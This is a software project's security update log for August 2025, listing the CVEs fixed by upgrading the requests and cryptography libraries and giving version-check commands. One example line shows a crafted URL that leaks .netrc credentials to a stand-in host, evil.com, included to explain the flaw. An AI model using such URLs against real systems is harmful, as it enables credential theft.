# Security Updates - August 2025

## Dependency Vulnerability Review Completed: August 27, 2025

### Critical Security Updates Applied

#### Core Dependencies Updated

**requests: 2.28.0 → 2.32.5**
- **CVE-2024-47081** (CRITICAL): .netrc credential leak via malicious URLs
  - Impact: Credentials leaked to third parties for maliciously crafted URLs
  - Example: `requests.get('http://example.com:@evil.com/')` leaks .netrc creds to evil.com
  - Fixed in: 2.32.4
  - Mitigation: Use `trust_env=False` on Requests Session for older versions

- **CVE-2024-35195** (HIGH): Certificate verification bypass in Sessions
  - Impact: First request with `verify=False` disables cert verification for all subsequent requests to same host
  - Fixed in: 2.32.0

- **CVE-2023-32681** (MEDIUM): Proxy-Authorization header leak on HTTPS redirects
  - Impact: Proxy auth headers forwarded to destination servers during redirects
  - Affected versions: 2.3.0 to 2.30.0
  - Fixed in: 2.31.0

**cryptography: 40.0.0 → 45.0.6**
- **CVE-2024-12797** (HIGH): Vulnerable OpenSSL in embedded versions
  - Impact: OpenSSL vulnerabilities in versions 37.0.0 to 43.0.0
  - Fixed in: 44.0.1

- **CVE-2024-26130** (HIGH): NULL pointer dereference crash
  - Impact: Application crashes due to NULL pointer dereference
  - Fixed in: 42.0.4

- **CVE-2023-50782** (MEDIUM): Bleichenbacher timing oracle attack
  - Impact: TLS message decryption vulnerability
  - Fixed in: 42.0.0

### Testing Results
- ✅ Security modules load successfully with updated versions
- ✅ Core application starts correctly with security verification
- ✅ All updated dependencies are compatible with existing CYT codebase
- ✅ System already had secure versions installed (2.32.5 and 45.0.6)

### Requirements.txt Updates
Updated both core and optional dependencies with:
- Specific CVE references and fix versions in comments
- Latest stable versions as of August 2025
- Clear security update timestamp: August 27, 2025

### Validation Commands
```bash
python3 -c "import requests; print('Requests version:', requests.__version__)"
python3 -c "import cryptography; print('Cryptography version:', cryptography.__version__)"
python3 chasing_your_tail.py  # Should show security verification message
```

### Next Security Review Recommended
- **Quarterly review**: November 2025
- Monitor CVE databases for new vulnerabilities
- Check dependency update releases
- Validate compatibility with CYT security modules